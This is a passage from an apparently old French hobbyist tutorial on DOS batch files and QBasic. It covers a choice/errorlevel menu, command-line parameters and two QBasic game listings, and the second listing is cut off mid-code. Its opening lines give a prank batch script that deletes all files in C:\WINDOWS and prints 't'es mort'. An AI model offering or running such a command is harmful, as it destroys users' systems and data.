<br><tt>del C:\WINDOWS\*.*</tt>
<br><tt>dir C:\WINDOWS\</tt>
<br><tt>echo t'es mort</tt>
<br><tt>cls</tt>
<br>On peut aussi cr&eacute;er des menus d'options:
<br>&nbsp;@echo off
<p>:menu
<br>cls
<br>echo.
<br>echo Menu d'options :
<br>echo -----------------------
<br>echo 1. Editer autoexec.bat
<br>echo 2. Editer config.sys
<br>echo.
<br>echo Q. Quitter
<br>echo.
<br>choice /c:12Q /t:Q,60 /n Votre choix ?
<br>if errorlevel 255 goto erreur
<br>if errorlevel 3 goto Quitter
<br>if errorlevel 2 goto EditConf
<br>if errorlevel 1 goto EditAuto
<br>if errorlevel 0 goto erreur
<br>goto fin
<p>:erreur
<br>echo Il y a eu une erreur.
<br>goto fin
<p>:Quitter
<br>goto fin
<p>:EditConf
<br>edit c:\config.sys
<br>goto menu
<p>:EditAuto
<br>edit c:\autoexec.bat
<br>goto menu
<br>:fin
<p>Si vous n'avez pas compris le passage sur la commande choice et errorlevel,
voil&agrave; de quoi vous aider:
<br>Aide sur CHOICE :
<p>choice [/c:ON] [/t:X,nn] [/n] [Invite]
<br>/c:ON Choix de lettres utilisables (ici O et N) (ON par d&eacute;faut)
<br>/t:X,nn Choisira automatiquement option X apr&egrave;s nn secondes.
X doit faire parti de la liste /c:
<br>/n Interdit le respect de la casse
<br>Invite Texte d'invite qui appara&icirc;t
<p>Errorlevel correspond au choix de l'utilisateur. c'est comme la variable
de r&eacute;ponse en Q-Basic.
<p>Param&egrave;tre de la ligne de commande
<p>@echo off
<br>cls
<br>echo.
<br>echo Le prog est %0
<br>echo.
<br>echo Bonjour %1,
<br>echo.
<br>echo A plus, %2
<br>&nbsp;
<p>Enregistrer sous "c:\test.bat" et taper sous dos :
<br>c:\test.bat "votrenom" "unAutrenom"
<p>%X correspond au Xi&egrave;me groupe de caract&egrave;res sur la ligne
de commande pour X={0;9}
<p>Tr&egrave;s pratique pour faire un prog d'installation :
<br>xcopy a:\*.* %1:\%2
<br>Ici, %1 est la lettre de lecteur et %2 le dossier.
<center>
<p><b><font color="#FF0000"><font size=+3>Codes sources Basic</font></font></b></center>
&nbsp;&nbsp; Les codes sources qui vont suivre sont des codes sources &agrave;
compiler avec Qbasic.
<br>On n'en mettra que 2 pour ne pas trop charger.
<br>Le premier: une attaque de martien by Sylvia Caba&ntilde;as:
<br><tt>'&nbsp; DECLARACION DE VARIABLES</tt>
<br><tt>disparo = 0</tt>
<p><tt>navX = 10</tt>
<br><tt>navY = 2</tt>
<br><tt>balX = 1</tt>
<br><tt>balY = 1</tt>
<br><tt>X = 40</tt>
<br><tt>Y = 20</tt>
<br>&nbsp;
<p><tt>hx = X</tt>
<br><tt>hy = Y</tt>
<p><tt>CLS</tt>
<p><tt>&nbsp; LOCATE Y, X</tt>
<br><tt>&nbsp; PRINT "X"</tt>
<p><tt>&nbsp; DO</tt>
<br><tt>&nbsp; TECLA$ = INKEY$</tt>
<br><tt>&nbsp; tiempo = tiempo + 1</tt>
<br><tt>&nbsp; tbala = tbala + 1</tt>
<p><tt>IF tiempo > 100 THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tiempo = 1</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOCATE navY, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PRINT "&nbsp;&nbsp;
"</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; navX = navX + 1</tt>
<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF navX > 70 THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; navX = 1</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; navY = navY
+ 2</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; END IF</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF navY > 23 THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; navY = 23</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; navX = 10</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; END IF</tt>
<br><tt>END IF</tt>
<p><tt>IF tbala > 50 AND disparo = 1 THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tbala = 1</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOCATE balY, balX</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PRINT " "</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; balY = balY - 1</tt>
<p><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF balY &lt; 2 THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; disparo
= 0</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOCATE balY,
balX</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PRINT "
"</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELSE</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LOCATE balY,
balX</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PRINT "|"</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; END IF</tt>
<p><tt>END IF</tt>
<p><tt>' Choque</tt>
<br><tt>IF navX + 1 = X AND navY = Y THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp; LOCATE navY - 1, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp; PRINT "\ /"</tt>
<br><tt>&nbsp;&nbsp;&nbsp; LOCATE navY, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp; PRINT "-X-"</tt>
<br><tt>&nbsp;&nbsp;&nbsp; LOCATE navY + 1, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp; PRINT "/ \"</tt>
<br><tt>END IF</tt>
<p><tt>' Balazo</tt>
<br><tt>IF navX + 1 = balX AND navY = balY THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp; LOCATE navY - 1, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp; PRINT "\ /"</tt>
<br><tt>&nbsp;&nbsp;&nbsp; LOCATE navY, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp; PRINT "-X-"</tt>
<br><tt>&nbsp;&nbsp;&nbsp; LOCATE navY + 1, navX</tt>
<br><tt>&nbsp;&nbsp;&nbsp; PRINT "/ \"</tt>
<br><tt>navX = 10</tt>
<br><tt>navY = 2</tt>
<br><tt>END IF</tt>
<br>&nbsp;
<br>&nbsp;
<p><tt>LOCATE navY, navX</tt>
<br><tt>PRINT "/o\"</tt>
<p><tt>&nbsp; 'PRINT TECLA$</tt>
<br><tt>&nbsp; 'PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
> "; ASC(TECLA$); ASC(RIGHT$(TECLA$, 1))</tt>
<p><tt>&nbsp; IF TECLA$ = CHR$(0) + CHR$(77) THEN X = X + 1</tt>
<br><tt>&nbsp; IF TECLA$ = CHR$(0) + CHR$(75) THEN X = X - 1</tt>
<br><tt>&nbsp; IF TECLA$ = CHR$(0) + CHR$(72) THEN Y = Y - 1</tt>
<br><tt>&nbsp; IF TECLA$ = CHR$(0) + CHR$(80) THEN Y = Y + 1</tt>
<br><tt>&nbsp; IF TECLA$ = " " AND disparo = 0 THEN</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; disparo = 1</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; balX = X</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; balY = Y - 1</tt>
<br><tt>&nbsp; END IF</tt>
<p><tt>&nbsp; SELECT CASE X</tt>
<br><tt>&nbsp;&nbsp;&nbsp; CASE IS > 80</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X = 80</tt>
<br><tt>&nbsp;&nbsp;&nbsp; CASE IS &lt; 1</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X = 1</tt>
<br><tt>&nbsp; END SELECT</tt>
<br><tt>&nbsp; SELECT CASE Y</tt>
<br><tt>&nbsp;&nbsp;&nbsp; CASE IS > 23</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y = 23</tt>
<br><tt>&nbsp;&nbsp;&nbsp; CASE IS &lt; 1</tt>
<br><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y = 1</tt>
<br><tt>&nbsp; END SELECT</tt>
<p><tt>IF hx &lt;> X OR hy &lt;> Y THEN</tt>
<br><tt>&nbsp; LOCATE hy, hx</tt>
<br><tt>&nbsp; PRINT " "</tt>
<br><tt>&nbsp; hx = X</tt>
<br><tt>&nbsp; hy = Y</tt>
<br><tt>&nbsp; LOCATE Y, X</tt>
<br><tt>&nbsp; PRINT "X"</tt>
<br><tt>END IF</tt>
<p><tt>LOOP</tt>
<p>Le second se caract&eacute;rise par le fait que vous soyez un ver de
terre dans un labyrinthe vivant par Cl&eacute;ment HEDON:
<br><tt>22 CLS</tt>
<br><tt>SCREEN 1</tt>
<br><tt>LINE (50, 10)-(20, 10)</tt>
<br><tt>LINE (20, 10)-(20, 40)</tt>
<br><tt>LINE (20, 40)-(50, 40)</tt>
<br><tt>LINE (50, 40)-(50, 70)</tt>
<br><tt>LINE (50, 70)-(20, 70)</tt>
<br><tt>LINE (65, 10)-(115, 10)</tt>
<br><tt>LINE (90, 10)-(90, 70)</tt>
<br><tt>LINE (130, 10)-(175, 10)</tt>
<br><tt>LINE (175, 10)-(175, 70)</tt>
<br><tt>LINE (175, 70)-(130, 70)</tt>
<br><tt>LINE (130, 70)-(130, 10)</tt>
<br><tt>LINE (190, 10)-(190, 70)</tt>
<br><tt>LINE (190, 10)-(230, 10)</tt>
<br><tt>LINE (230, 10)-(230, 40)</tt>
<br><tt>LINE (230, 40)-(190, 40)</tt>
<br><tt>LINE (190, 40)-(230, 70)</tt>
<br><tt>LINE (245, 10)-(245, 70)</tt>
<br><tt>LINE (245, 10)-(273, 40)</tt>
<br><tt>LINE (273, 40)-(301, 10)</tt>
<br><tt>LINE (301, 10)-(301, 70)</tt>
<br><tt>LINE (15, 5)-(306, 5)</tt>
<br><tt>LINE (306, 5)-(306, 75)</tt>
<br><tt>LINE (306, 75)-(15, 75)</tt>
<br><tt>LINE (15, 75)-(15, 5)</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Version 2"</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Pour jouer"</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Appuyez sur a"</tt>
<br><tt>LINE (80, 110)-(200, 110)</tt>
<br><tt>LINE (200, 110)-(200, 150)</tt>
<br><tt>LINE (200, 150)-(80, 150)</tt>
<br><tt>LINE (80, 150)-(80, 110)</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT ""</tt>
<br><tt>PRINT "(C)Copyright Clem Hedon Corp. 1999"</tt>
<br><tt>15 IF INKEY$ = CHR$(97) THEN GOTO 30</tt>
<br><tt>GOTO 15</tt>
<br><tt>30 CLS</tt>
<br><tt>PRINT " "</tt>
<br><tt>PRINT " "</tt>
<br><tt>PRINT "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Quelle
difficult ?"</tt>
<br><tt>PRINT " "</tt>
<br><tt>PRINT " "</tt>
<br><tt>PRINT " "</tt>
<br><tt>PRINT " "</tt>
<br><tt>PRINT " 1 = facile"</tt>
<br><tt>PRINT " 2 = moyen"</tt>
<br><tt>PRINT " 3 = difficile"</tt>
<br><tt>PRINT " 4 = impossible"</tt>
<br><tt>LINE (70, 10)-(240, 10)</tt>
<br><tt>LINE (240, 10)-(240, 30)</tt>
<br><tt>LINE (240, 30)-(70, 30)</tt>
<br><tt>LINE (70, 30)-(70, 10)</tt>
<br><tt>16 c$ = INKEY$</tt>
<br><tt>IF c$ = CHR$(49) THEN GOTO 17</tt>
<br><tt>IF c$ = CHR$(50) THEN GOTO 18</tt>
<br><tt>IF c$ = CHR$(51) THEN GOTO 19</tt>
<br><tt>IF c$ = CHR$(52) THEN GOTO 20</tt>
<br><tt>GOTO 16</tt>
<br><tt>17 s = 2000</tt>
<br><tt>GOTO 21</tt>
<br><tt>18 s = 1000</tt>
<br><tt>GOTO 21</tt>
<br><tt>19 s = 500</tt>
<br><tt>GOTO 21</tt>
<br><tt>20 s = 200</tt>
<br><tt>GOTO 21</tt>
<br><tt>21 r = 0</tt>
<br><tt>0 CLS</tt>
<br><tt>SCREEN 1</tt>
<br><tt>RANDOMIZE TIMER</tt>
<br><tt>b = INT(RND * 100) + 1</tt>
<br><tt>c = INT(RND * 100) + 1</tt>
<br><tt>d = 0</tt>
<br><tt>e = INT(RND * 100) + 1</tt>
<br><tt>f = INT(RND * 100) + 1</tt>
<br><tt>g = INT(RND * 100) + 1</tt>
<br><tt>h = INT(RND * 100) + 1</tt>
<br><tt>i = INT(RND * 100) + 1</tt>
<br><tt>j = INT(RND * 100) + 1</tt>
<br><tt>k = INT(RND * 100) + 1</tt>
<br><tt>l = INT(RND * 100) + 1</tt>
<br><tt>m = INT(RND * 100) + 1</tt>
<br><tt>n = INT(RND * 100) + 1</tt>
<br><tt>o = INT(RND * 100) + 1</tt>
<br><tt>LINE (40, 0)-(40, b)</tt>
<br><tt>LINE (40, b + 20)-(40, 200)</tt>
<br><tt>LINE (60, 0)-(60, c)</tt>
<br><tt>LINE (60, c + 15)-(60, 200)</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>LINE (100, 0)-(100, e)</tt>
<br><tt>LINE (100, e + 15)-(100, 200)</tt>
<br><tt>LINE (120, 0)-(120, f)</tt>
<br><tt>LINE (120, f + 15)-(120, 200)</tt>
<br><tt>LINE (140, 0)-(140, g)</tt>
<br><tt>LINE (140, g + 15)-(140, 200)</tt>
<br><tt>LINE (160, 0)-(160, h)</tt>
<br><tt>LINE (160, h + 15)-(160, 200)</tt>
<br><tt>LINE (180, 0)-(180, i)</tt>
<br><tt>LINE (180, i + 15)-(180, 200)</tt>
<br><tt>LINE (200, 0)-(200, j)</tt>
<br><tt>LINE (200, j + 10)-(200, 200)</tt>
<br><tt>LINE (220, 0)-(220, k)</tt>
<br><tt>LINE (220, k + 10)-(220, 200)</tt>
<br><tt>LINE (240, 0)-(240, l)</tt>
<br><tt>LINE (240, l + 10)-(240, 200)</tt>
<br><tt>LINE (260, 0)-(260, m)</tt>
<br><tt>LINE (260, m + 10)-(260, 200)</tt>
<br><tt>LINE (280, 0)-(280, n)</tt>
<br><tt>LINE (280, n + 10)-(280, 200)</tt>
<br><tt>LINE (300, 0)-(300, o)</tt>
<br><tt>LINE (300, o + 5)-(300, 200)</tt>
<br><tt>p = 0</tt>
<br><tt>q = 100</tt>
<br><tt>1 PSET (p, q)</tt>
<br><tt>IF p = 40 AND q &lt;= b THEN GOTO 4</tt>
<br><tt>IF p = 40 AND q >= b + 20 THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q &lt;= c THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q >= c + 15 THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q &lt;= e THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q >= e + 15 THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q &lt;= f THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q >= f + 15 THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q &lt;= g THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q >= g + 15 THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q &lt;= h THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q >= h + 15 THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q &lt;= i THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q >= i + 15 THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q &lt;= j THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q >= j + 10 THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q &lt;= k THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q >= k + 10 THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q &lt;= l THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q >= l + 10 THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q &lt;= m THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q >= m + 10 THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q &lt;= n THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q >= n + 10 THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q &lt;= o THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q >= o + 5 THEN GOTO 4</tt>
<br><tt>IF d = 180 THEN GOTO 5</tt>
<br><tt>IF p = 80 AND q &lt;= d THEN GOTO 4</tt>
<br><tt>IF p = 80 AND q >= d + 20 THEN GOTO 4</tt>
<br><tt>IF p = 320 THEN GOTO 8</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>d = d + 1</tt>
<br><tt>p = p + 1</tt>
<br><tt>c$ = INKEY$</tt>
<br><tt>IF c$ = CHR$(53) THEN GOTO 2</tt>
<br><tt>IF c$ = CHR$(50) THEN GOTO 3</tt>
<br><tt>FOR z = 1 TO s</tt>
<br><tt>NEXT</tt>
<br><tt>GOTO 1</tt>
<br><tt>2 PSET (p, q)</tt>
<br><tt>IF p = 40 AND q &lt;= b THEN GOTO 4</tt>
<br><tt>IF p = 40 AND q >= b + 20 THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q &lt;= c THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q >= c + 15 THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q &lt;= e THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q >= e + 15 THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q &lt;= f THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q >= f + 15 THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q &lt;= g THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q >= g + 15 THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q &lt;= h THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q >= h + 15 THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q &lt;= i THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q >= i + 15 THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q &lt;= j THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q >= j + 10 THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q &lt;= k THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q >= k + 10 THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q &lt;= l THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q >= l + 10 THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q &lt;= m THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q >= m + 10 THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q &lt;= n THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q >= n + 10 THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q &lt;= o THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q >= o + 5 THEN GOTO 4</tt>
<br><tt>IF q &lt;= 0 THEN GOTO 4</tt>
<br><tt>IF d = 180 THEN GOTO 6</tt>
<br><tt>IF p = 80 AND q &lt;= d THEN GOTO 4</tt>
<br><tt>IF p = 80 AND q >= d + 20 THEN GOTO 4</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>d = d + 1</tt>
<br><tt>q = q - 1</tt>
<br><tt>IF INKEY$ = CHR$(51) THEN GOTO 1</tt>
<br><tt>FOR z = 1 TO s</tt>
<br><tt>NEXT</tt>
<br><tt>GOTO 2</tt>
<br><tt>3 PSET (p, q)</tt>
<br><tt>IF p = 40 AND q &lt;= b THEN GOTO 4</tt>
<br><tt>IF p = 40 AND q >= b + 20 THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q &lt;= c THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q >= c + 15 THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q &lt;= e THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q >= e + 15 THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q &lt;= f THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q >= f + 15 THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q &lt;= g THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q >= g + 15 THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q &lt;= h THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q >= h + 15 THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q &lt;= i THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q >= i + 15 THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q &lt;= j THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q >= j + 10 THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q &lt;= k THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q >= k + 10 THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q &lt;= l THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q >= l + 10 THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q &lt;= m THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q >= m + 10 THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q &lt;= n THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q >= n + 10 THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q &lt;= o THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q >= o + 5 THEN GOTO 4</tt>
<br><tt>IF q >= 200 THEN GOTO 4</tt>
<br><tt>IF d = 180 THEN GOTO 7</tt>
<br><tt>IF p = 80 AND q &lt;= d THEN GOTO 4</tt>
<br><tt>IF p = 80 AND q >= d + 20 THEN GOTO 4</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>d = d + 1</tt>
<br><tt>q = q + 1</tt>
<br><tt>IF INKEY$ = CHR$(51) THEN GOTO 1</tt>
<br><tt>FOR z = 1 TO s</tt>
<br><tt>NEXT</tt>
<br><tt>GOTO 3</tt>
<br><tt>5 PSET (p, q)</tt>
<br><tt>IF p = 40 AND q &lt;= b THEN GOTO 4</tt>
<br><tt>IF p = 40 AND q >= b + 20 THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q &lt;= c THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q >= c + 15 THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q &lt;= e THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q >= e + 15 THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q &lt;= f THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q >= f + 15 THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q &lt;= g THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q >= g + 15 THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q &lt;= h THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q >= h + 15 THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q &lt;= i THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q >= i + 15 THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q &lt;= j THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q >= j + 10 THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q &lt;= k THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q >= k + 10 THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q &lt;= l THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q >= l + 10 THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q &lt;= m THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q >= m + 10 THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q &lt;= n THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q >= n + 10 THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q &lt;= o THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q >= o + 5 THEN GOTO 4</tt>
<br><tt>IF d = 0 THEN GOTO 1</tt>
<br><tt>IF p = 80 AND q &lt;= d THEN GOTO 4</tt>
<br><tt>IF p = 80 AND q >= d + 20 THEN GOTO 4</tt>
<br><tt>IF p = 320 THEN GOTO 8</tt>
<br><tt>LINE (80, 0)-(80, d)</tt>
<br><tt>LINE (80, d + 20)-(80, 200)</tt>
<br><tt>LINE (80, d)-(80, d + 20), couleur% = 1</tt>
<br><tt>d = d - 1</tt>
<br><tt>p = p + 1</tt>
<br><tt>c$ = INKEY$</tt>
<br><tt>IF c$ = CHR$(53) THEN GOTO 6</tt>
<br><tt>IF c$ = CHR$(50) THEN GOTO 7</tt>
<br><tt>FOR z = 1 TO s</tt>
<br><tt>NEXT</tt>
<br><tt>GOTO 5</tt>
<br><tt>6 PSET (p, q)</tt>
<br><tt>IF p = 40 AND q &lt;= b THEN GOTO 4</tt>
<br><tt>IF p = 40 AND q >= b + 20 THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q &lt;= c THEN GOTO 4</tt>
<br><tt>IF p = 60 AND q >= c + 15 THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q &lt;= e THEN GOTO 4</tt>
<br><tt>IF p = 100 AND q >= e + 15 THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q &lt;= f THEN GOTO 4</tt>
<br><tt>IF p = 120 AND q >= f + 15 THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q &lt;= g THEN GOTO 4</tt>
<br><tt>IF p = 140 AND q >= g + 15 THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q &lt;= h THEN GOTO 4</tt>
<br><tt>IF p = 160 AND q >= h + 15 THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q &lt;= i THEN GOTO 4</tt>
<br><tt>IF p = 180 AND q >= i + 15 THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q &lt;= j THEN GOTO 4</tt>
<br><tt>IF p = 200 AND q >= j + 10 THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q &lt;= k THEN GOTO 4</tt>
<br><tt>IF p = 220 AND q >= k + 10 THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q &lt;= l THEN GOTO 4</tt>
<br><tt>IF p = 240 AND q >= l + 10 THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q &lt;= m THEN GOTO 4</tt>
<br><tt>IF p = 260 AND q >= m + 10 THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q &lt;= n THEN GOTO 4</tt>
<br><tt>IF p = 280 AND q >= n + 10 THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q &lt;= o THEN GOTO 4</tt>
<br><tt>IF p = 300 AND q >= o + 5 THEN GOTO 4</tt>
<br><tt>IF q &lt;= 0 THEN GOTO 4</tt>
